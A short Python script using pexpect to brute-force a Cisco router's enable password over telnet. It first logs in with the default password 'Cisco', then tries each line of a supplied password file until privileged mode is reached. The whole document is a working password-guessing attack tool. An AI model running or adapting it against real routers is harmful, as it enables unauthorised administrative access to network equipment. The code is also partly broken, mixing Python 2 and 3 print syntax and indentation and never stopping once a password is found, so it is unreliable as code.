# 
#==============================================================

import pexpect
import sys
import getopt

def main(argv):
	try:
		opts, args = getopt.getopt(argv,"hr:f:n:v:",["router=","pfile=","hostname=","verbose="])
	except getopt.GetoptError:
		print ('cisco_router_bf.py -r <router ip> -f <password file> -n <router hostname> -v <yes/no verbose>')
		sys.exit(2)
	for opt, arg in opts:
		if opt == '-h':
			print ('cisco_router_bf.py -r <router ip> -f <password file> -n <router hostname> -v <yes/no verbose>')
			sys.exit()
		elif opt in ("-r", "--router"):
			HOST = arg
		elif opt in ("-f", "--pfile"):
			PASSWORDFILE = arg
		elif opt in ("-n", "--hostname"):
			HOSTNAME = arg
		elif opt in ("-v", "--verbose"):
			VERBOSE = arg

	if VERBOSE == "yes":
		print "Starting bruteforce on: " + HOST
	pwf = open(PASSWORDFILE)
	lines = pwf.readlines()
	numberOfPasswords = sum(1 for line in open(PASSWORDFILE))
	currentPasswordCounter = 0

	child = pexpect.spawn ('telnet '+ HOST)
	child.expect ('Password: ')
	child.sendline ("Cisco")
	if VERBOSE == "yes":
		print "Logging into show mode now"
	child.expect (HOSTNAME+'>')
	child.sendline ('enable')
	if VERBOSE == "yes":
		print "Starting enable password bruteforce"

	while currentPasswordCounter < numberOfPasswords:
	    index = child.expect(['Password: ', '% Bad secrets', HOSTNAME +'#'])
	    if index == 0:
	        child.sendline (lines[currentPasswordCounter])
	        if VERBOSE == "yes":
				print "Trying password: " + lines[currentPasswordCounter]
	        currentPasswordCounter += 1
	    elif index == 1:
	        child.sendline ('enable')
	        if VERBOSE == "yes":
				print "Going back to enable mode"
	    elif index == 2:
	    	print "Found password" + lines[currentPasswordCounter]

	print "No success with loaded password file"

if __name__ == "__main__":
	main(sys.argv[1:])
